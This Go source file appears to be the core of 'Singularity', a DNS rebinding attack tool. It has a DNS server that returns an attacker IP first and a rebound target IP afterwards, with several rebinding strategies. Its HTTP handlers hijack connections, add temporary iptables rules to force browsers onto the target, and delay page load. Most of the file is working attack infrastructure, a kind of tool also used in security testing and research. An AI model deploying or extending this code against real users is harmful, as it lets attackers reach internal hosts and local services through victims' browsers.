package singularity

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

/*** General Stuff ***/

//DNSRebindingStrategy maps a DNS Rebinding strategy name to a function
var DNSRebindingStrategy = map[string]func(session string, dcss *DNSClientStateStore, q dns.Question) []string{
	"fromqueryroundrobin":      DNSRebindFromQueryRoundRobin,
	"fromqueryfirstthensecond": DNSRebindFromQueryFirstThenSecond,
	"fromqueryrandom":          DNSRebindFromQueryRandom,
	"fromquerymultia":          DNSRebindFromQueryMultiA,
}

// DNSClientStateStore stores DNS sessions
// It permits to respond to multiple clients
// based on their current DNS rebinding state.
// Must use RO or RW mutex to access.
type DNSClientStateStore struct {
	RebindingStrategy string
	sync.RWMutex
	Sessions map[string]*DNSClientState
}

// AppConfig stores running parameter of singularity server.
type AppConfig struct {
	HTTPServerPorts              []int
	ResponseIPAddr               string
	ResponseReboundIPAddr        string
	RebindingFn                  func(session string, dcss *DNSClientStateStore, q dns.Question) []string
	RebindingFnName              string
	ResponseReboundIPAddrtimeOut int
	AllowDynamicHTTPServers      bool
}

/*** DNS Stuff ***/

// DNSClientState holds the current rebinding state of client.
type DNSClientState struct {
	LastQueryTime                time.Time
	CurrentQueryTime             time.Time
	ResponseIPAddr               string
	ResponseReboundIPAddr        string
	LastResponseReboundIPAddr    int
	ResponseReboundIPAddrtimeOut int
	DNSCacheFlush                bool
}

// ExpireOldEntries expire DNS Client Sessions
// that existed longer than duration
// Old entries are expire at a provided interval
// Someone could possibly fill memory before old entries are expired
func (dcss *DNSClientStateStore) ExpireOldEntries(duration time.Duration) {
	dcss.Lock()
	for sk, sv := range dcss.Sessions {
		diff := time.Since(sv.LastQueryTime)
		if (!sv.LastQueryTime.IsZero()) && (diff > duration) {
			delete(dcss.Sessions, sk)
		}
	}
	dcss.Unlock()
}

// DNSQuery is a convenience structure to hold
// the parsed DNS query of a client.
type DNSQuery struct {
	ResponseIPAddr        string
	ResponseReboundIPAddr string
	Session               string
	DNSRebindingStrategy  string
	DNSCacheFlush         bool
	Domain                string
}

// NewDNSQuery parses DNS query string
// and returns a DNSQuery structure.
func NewDNSQuery(qname string) (*DNSQuery, error) {
	name := new(DNSQuery)

	split := strings.Split(qname, "-e.")

	if len(split) == 1 {
		return name, errors.New("cannot find end tag in DNS query")
	}

	head := split[0]

	tail := strings.Split(head, "s-")

	if len(tail) == 1 {
		return name, errors.New("cannot find start tag in DNS query")
	}

	elements := strings.Split(tail[1], "-")

	domainSuffix := split[1]

	if (len(domainSuffix) < 3) && (strings.ContainsAny(domainSuffix, ".") == false) {
		return name, errors.New("cannot parse domain in DNS query")
	}

	if len(elements) != 4 {
		return name, errors.New("cannot parse DNS query")
	}

	if net.ParseIP(elements[0]) == nil {
		return name, errors.New("cannot parse IP address of first host in DNS query")

	}
	name.ResponseIPAddr = elements[0]

	if elements[1] != "localhost" {

		if net.ParseIP(elements[1]) == nil {
			return name, errors.New("cannot parse IP address of second host in DNS query")

		}
	}
	name.ResponseReboundIPAddr = elements[1]

	name.Session = elements[2]

	if len(name.Session) == 0 {
		return name, errors.New("cannot parse session in DNS query")

	}

	/*if len(elements[3]) != 0 {
		name.DNSCacheFlush = true
	}
	*/

	name.DNSRebindingStrategy = elements[3]

	name.Domain = fmt.Sprintf(".%v", domainSuffix)

	return name, nil
}

// dnsRebindFirst is a convenience function
// that always returns the first host in DNS query
func dnsRebindFirst(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	dcss.RUnlock()
	return answers
}

// DNSRebindFromQueryFirstThenSecond is a response handler to DNS queries
// It extracts the hosts in the DNS query string
// It first returns the first host once in the DNS query string
// then the second host in all subsequent queries for a period of time timeout.
func DNSRebindFromQueryFirstThenSecond(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	dnsCacheFlush := dcss.Sessions[session].DNSCacheFlush
	elapsed := dcss.Sessions[session].CurrentQueryTime.Sub(dcss.Sessions[session].LastQueryTime)
	timeOut := dcss.Sessions[session].ResponseReboundIPAddrtimeOut

	log.Printf("DNS: in DNSRebindFromQueryFirstThenSecond\n")

	if dnsCacheFlush == false { // This is not a request for cache eviction
		if elapsed < (time.Second * time.Duration(timeOut)) {
			answers[0] = dcss.Sessions[session].ResponseReboundIPAddr
		}
	}
	dcss.RUnlock()
	return answers
}

// DNSRebindFromQueryRandom is a response handler to DNS queries
// It extracts the two hosts in the DNS query string
// then returns either extracted hosts randomly
func DNSRebindFromQueryRandom(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	dnsCacheFlush := dcss.Sessions[session].DNSCacheFlush
	hosts := []string{dcss.Sessions[session].ResponseIPAddr, dcss.Sessions[session].ResponseReboundIPAddr}
	dcss.RUnlock()

	log.Printf("DNS: in DNSRebindFromQueryRandom\n")

	if dnsCacheFlush == false { // This is not a request for cache eviction
		answers[0] = hosts[rand.Intn(len(hosts))]
	}

	return answers
}

// DNSRebindFromQueryRoundRobin is a response handler to DNS queries
// It extracts the two hosts in the DNS query string
// then returns the extracted hosts in a round robin fashion
func DNSRebindFromQueryRoundRobin(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr}
	dnsCacheFlush := dcss.Sessions[session].DNSCacheFlush
	ResponseIPAddr := dcss.Sessions[session].ResponseIPAddr
	ResponseReboundIPAddr := dcss.Sessions[session].ResponseReboundIPAddr
	LastResponseReboundIPAddr := dcss.Sessions[session].LastResponseReboundIPAddr
	dcss.RUnlock()

	log.Printf("DNS: in DNSRebindFromQueryRoundRobin\n")

	if dnsCacheFlush == false { // This is not a request for cache eviction
		hosts := []string{"", ResponseIPAddr, ResponseReboundIPAddr}
		switch LastResponseReboundIPAddr {
		case 0:
			LastResponseReboundIPAddr = 1
		case 1:
			LastResponseReboundIPAddr = 2
		case 2:
			LastResponseReboundIPAddr = 1
		}
		dcss.Lock()
		dcss.Sessions[session].LastResponseReboundIPAddr = LastResponseReboundIPAddr
		dcss.Unlock()
		answers[0] = hosts[LastResponseReboundIPAddr]
	}

	return answers
}

// DNSRebindFromQueryMultiA s a response handler to DNS queries
// It extracts the two hosts in the DNS query string
// then returns the extracted hosts as multiple DNS A records
func DNSRebindFromQueryMultiA(session string, dcss *DNSClientStateStore, q dns.Question) []string {
	dcss.RLock()
	answers := []string{dcss.Sessions[session].ResponseIPAddr, dcss.Sessions[session].ResponseReboundIPAddr}
	dcss.RUnlock()
	log.Printf("DNS: in DNSRebindFromQueryMultiA\n")
	return answers
}

// MakeRebindDNSHandler generates a DNS request handler
// based on app settings.
// This is the core DNS queries handling loop
func MakeRebindDNSHandler(appConfig *AppConfig, dcss *DNSClientStateStore) dns.HandlerFunc {
	return func(w dns.ResponseWriter, r *dns.Msg) {
		name := &DNSQuery{}
		clientState := &DNSClientState{}
		now := time.Now()
		rebindingFn := appConfig.RebindingFn

		m := new(dns.Msg)
		m.SetReply(r)
		m.Compress = false

		switch r.Opcode {
		case dns.OpcodeQuery:
			for _, q := range m.Question {
				switch q.Qtype {
				case dns.TypeA:
					log.Printf("DNS: Received A query: %v from: %v\n", q.Name, w.RemoteAddr().String())

					// Preparing to update the client DNS query state
					clientState.CurrentQueryTime = now
					clientState.ResponseReboundIPAddrtimeOut = appConfig.ResponseReboundIPAddrtimeOut
					clientState.DNSCacheFlush = false

					var err error
					name, err = NewDNSQuery(q.Name)
					log.Printf("DNS: Parsed query: %v, error: %v\n", name, err)

					if err != nil {
						// We could not parse the query, set default response settings
						clientState.ResponseIPAddr = appConfig.ResponseIPAddr
						clientState.ResponseReboundIPAddr = appConfig.ResponseReboundIPAddr
						// Strategy is to return clientState.ResponseIPAddr
						rebindingFn = dnsRebindFirst
					} else {
						clientState.ResponseIPAddr = name.ResponseIPAddr
						clientState.ResponseReboundIPAddr = name.ResponseReboundIPAddr
						clientState.DNSCacheFlush = name.DNSCacheFlush
						if fn, ok := DNSRebindingStrategy[name.DNSRebindingStrategy]; ok {
							rebindingFn = fn
						}
					}

					_, keyExists := dcss.Sessions[name.Session]
					log.Printf("DNS: session exists: %v\n", keyExists)

					dcss.Lock()
					if keyExists != true {
						// New session
						dcss.Sessions[name.Session] = clientState
					} else {
						// Existing session
						dcss.Sessions[name.Session].ResponseIPAddr = clientState.ResponseIPAddr
						dcss.Sessions[name.Session].ResponseReboundIPAddr = clientState.ResponseReboundIPAddr
					}
					dcss.Sessions[name.Session].DNSCacheFlush = clientState.DNSCacheFlush
					dcss.Unlock()

					answers := rebindingFn(name.Session, dcss, q)

					response := []string{}

					if len(answers) == 1 { //we return only one answer

						if answers[0] == "localhost" { //we respond with a CNAME record

							response = append(response, fmt.Sprintf("%s 10 IN CNAME %s.", q.Name, answers[0]))

						} else { // We respond with a A record
							response = append(response, fmt.Sprintf("%s 0 IN A %s", q.Name, answers[0]))

						}
					} else { // We respond multiple answers
						response = append(response, fmt.Sprintf("%s 10 IN A %s", q.Name, answers[0]))
						response = append(response, fmt.Sprintf("%s 10 IN A %s", q.Name, answers[1]))

					}

					dcss.Lock()
					dcss.Sessions[name.Session].CurrentQueryTime = now
					dcss.Sessions[name.Session].LastQueryTime = now
					dcss.Unlock()

					for _, resp := range response {

						rr, err := dns.NewRR(resp)
						if err == nil {
							m.Answer = append(m.Answer, rr)
							log.Printf("DNS: response: %v\n", resp)
						}
					}
				}
			}
		}
		w.WriteMsg(m)
	}
}

/*** HTTP Stuff ***/

// DefaultHeadersHandler is a HTTP handler that adds default headers to responses
// for all routes
type DefaultHeadersHandler struct {
	NextHandler http.Handler
}

// HTTPServerStoreHandler holds the list of HTTP servers
// Many servers at startup and one (1) dynamically instantianted server
// Access to the servers list must be performed via mutex
type HTTPServerStoreHandler struct {
	Errc                    chan HTTPServerError // communicates http server errors
	AllowDynamicHTTPServers bool
	sync.RWMutex
	DynamicServers []*http.Server
	StaticServers  []*http.Server
	Dcss           *DNSClientStateStore
}

// IPTablesHandler is a HTTP handler that adds/removes iptables rules
// if the DNS rebinding strategy is to respond with multiple A records.
type IPTablesHandler struct {
}

type httpServerInfo struct {
	Port string
}

// HTTPServersConfig is a stucture that is returned
// to JS client to inform about Singularity HTTP ports
// and whether dynamic HTTP server allocation is allowed
type HTTPServersConfig struct {
	ServerInformation       []httpServerInfo
	AllowDynamicHTTPServers bool
}

// HTTP Handler for "/" - Add headers then calls next NextHandler()

func (d *DefaultHeadersHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate") // HTTP 1.1
	w.Header().Set("Pragma", "no-cache")                                   // HTTP 1.0
	w.Header().Set("Expires", "0")                                         // Proxies
	w.Header().Set("X-DNS-Prefetch-Control", "off")                        //Chrome
	d.NextHandler.ServeHTTP(w, r)
}

// HTTP Handler for /servers
func (hss *HTTPServerStoreHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {

	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)

	w.Header().Set("Content-Type", "application/json; charset=UTF-8")

	serverInfo := httpServerInfo{}
	emptyResponse, _ := json.Marshal(serverInfo)
	emptyResponseStr := string(emptyResponse)
	serverInfos := make([]httpServerInfo, 0)

	switch r.Method {
	case "GET":

		hss.RLock()
		for _, server := range hss.StaticServers {
			if server != nil {
				staticServerInfo := httpServerInfo{}
				staticServerInfo.Port = strings.Split(server.Addr, ":")[1]
				serverInfos = append(serverInfos, staticServerInfo)
			}
		}
		for _, server := range hss.DynamicServers {
			if server != nil {
				dynamicServerInfo := httpServerInfo{}
				dynamicServerInfo.Port = strings.Split(server.Addr, ":")[1]
				serverInfos = append(serverInfos, dynamicServerInfo)
			}
		}
		hss.RUnlock()

		myHTTPServersConfig := HTTPServersConfig{ServerInformation: serverInfos,
			AllowDynamicHTTPServers: hss.AllowDynamicHTTPServers}

		s, err := json.Marshal(myHTTPServersConfig)

		println(string(s))

		if err != nil {
			http.Error(w, emptyResponseStr, 500)
			return
		}

		fmt.Fprintf(w, "%v", string(s))

	case "PUT":

		if hss.AllowDynamicHTTPServers == false {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		err = json.Unmarshal(body, &serverInfo)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		port, err := strconv.Atoi(serverInfo.Port)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		hss.Lock()
		if hss.DynamicServers[0] != nil {
			StopHTTPServer(hss.DynamicServers[0], hss)
			hss.DynamicServers[0] = nil
		}
		hss.Unlock()

		httpServer := NewHTTPServer(port, hss, hss.Dcss)
		httpServerErr := StartHTTPServer(httpServer, hss, true)

		if httpServerErr != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		s, err := json.Marshal(serverInfo)
		if err != nil {
			http.Error(w, emptyResponseStr, 400)
			return
		}

		fmt.Fprintf(w, "%v", string(s))

	default:
		http.Error(w, emptyResponseStr, 400)
		return
	}

}

func (ipt *IPTablesHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)

	hj, ok := w.(http.Hijacker)
	if !ok {
		log.Printf("HTTP: webserver doesn't support hijacking\n")
		return
	}
	conn, bufrw, err := hj.Hijack()
	if err != nil {
		log.Printf("HTTP: could not hijack http server connection: %v\n", err.Error())
		return
	}

	defer conn.Close()

	log.Printf("HTTP: implementing firewall rule for %v\n", conn.RemoteAddr())
	dst := strings.Split(conn.LocalAddr().String(), ":")
	src := strings.Split(conn.RemoteAddr().String(), ":")
	srcAddr := src[0]
	srcPort := src[1]
	dstAddr := dst[0]
	dstPort := dst[1]

	ipTablesRule := NewIPTableRule(srcAddr, srcPort, dstAddr, dstPort)
	go func(rule *IPTablesRule) {
		time.Sleep(time.Second * time.Duration(5))
		ipTablesRule.RemoveRule()
	}(ipTablesRule)

	ipTablesRule.AddRule()

	//Instead of writing the beginning of a valid HTTP response
	// e.g. bufrw.WriteString("HTTP")
	// that works with most browsers except Edge,
	// we write the token value for Edge to determine whether it is connected to
	// target or attacker. TODO make this value a startup parameter.
	bufrw.WriteString("thisismytesttoken")
	bufrw.Flush()

}

// DelayDOMLoadHandler is a HTTP handler that forces browsers
// to wait for more data thus delaying DOM load event.
type DelayDOMLoadHandler struct{}

func (h *DelayDOMLoadHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
	hj, ok := w.(http.Hijacker)
	if !ok {
		log.Printf("HTTP: webserver doesn't support hijacking\n")
		return
	}
	conn, bufrw, err := hj.Hijack()
	if err != nil {
		log.Printf("HTTP: could not hijack http server connection: %v\n", err.Error())
		return
	}

	defer conn.Close()

	bufrw.WriteString("HTTP/1.1 200 OK\r\n" +
		"Cache-Control: no-cache, no-store, must-revalidate\r\nContent-Length: 4\r\nContent-Type: text/html\r\n" +
		"Expires: 0\r\nPragma: no-cache\r\nX-Dns-Prefetch-Control: off\r\nConnection: close\r\n\r\n<ht")
	bufrw.Flush()
	time.Sleep(10 * time.Second)
}

// NewHTTPServer configures a HTTP server
func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateStore) *http.Server {
	d := &DefaultHeadersHandler{NextHandler: http.FileServer(http.Dir("./html"))}
	ipth := &IPTablesHandler{}
	delayDOMLoadHandler := &DelayDOMLoadHandler{}
	h := http.NewServeMux()

	h.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
		//We handle the particular case where we use multiple A records DNS rebinding.
		// We hijack the connection from the HTTP server
		// * if we have a DNS session with the client browser
		// * and if this session is more than 3 seconds.
		// Then we create a Linux iptables rule that drops the connection from the browser
		// using an unsolicited TCP RST packet.
		// The connection being dropped is defined by the source address,
		// source port range(current port + 10) and the server address and port.
		// The rule is removed after 10 seconds after being implemented.
		// In the singularity manager interface,
		// we need to ensure that the polling interval is fast, e.g. 1 sec.

		log.Printf("HTTP: %v %v from %v", req.Method, req.RequestURI, req.RemoteAddr)

		name, err := NewDNSQuery(req.Host)
		if err == nil {

			dcss.RLock()
			dnsCacheFlush := dcss.Sessions[name.Session].DNSCacheFlush
			elapsed := time.Now().Sub(dcss.Sessions[name.Session].CurrentQueryTime)
			//rebindingStrategy := dcss.RebindingStrategy
			dcss.RUnlock()

			if name.DNSRebindingStrategy == "fromquerymultia" {
				if dnsCacheFlush == false { // This is not a request for cache eviction
					if elapsed > (time.Second * time.Duration(3)) {
						log.Printf("HTTP: attempting Multiple A records rebinding for: %v", name)
						ipth.ServeHTTP(w, req)
						return
					}
				}
			}
		}
		d.ServeHTTP(w, req)
	})

	h.Handle("/servers", hss)
	h.Handle("/delaydomload", delayDOMLoadHandler)

	httpServer := &http.Server{Addr: ":" + strconv.Itoa(port), Handler: h}

	// drop browser connections after delivering
	// so they dont keep socket alive and facilitate rebinding.
	httpServer.SetKeepAlivesEnabled(false)

	return httpServer
}

// HTTPServerError is used to report issues with an HTTP instance
// when started or closed
type HTTPServerError struct {
	Err  error
	Port string
}

// StartHTTPServer starts an HTTP server
// and adds it to  dynamic (if dynamic is true) or static HTTP Store
func StartHTTPServer(s *http.Server, hss *HTTPServerStoreHandler, dynamic bool) error {

	var err error

	l, err := net.Listen("tcp", s.Addr)
	if err != nil {
		return err
	}

	hss.Lock()
	if dynamic == true {
		found := false
		for _, v := range hss.StaticServers {
			if (v != nil) && (v.Addr == s.Addr) {
				found = true
				break
			}
		}
		if found != true {
			hss.DynamicServers[0] = s
		}

	} else {
		hss.StaticServers = append(hss.StaticServers, s)
	}

	hss.Unlock()

	go func() {
		log.Printf("HTTP: starting HTTP Server on %v\n", s.Addr)
		routineErr := s.Serve(l)
		hss.Errc <- HTTPServerError{Err: routineErr, Port: s.Addr}
	}()

	return err

}

// StopHTTPServer stops an HTTP server
func StopHTTPServer(s *http.Server, hss *HTTPServerStoreHandler) {
	log.Printf("HTTP: stopping HTTP Server on %v\n", s.Addr)
	s.Close()
}
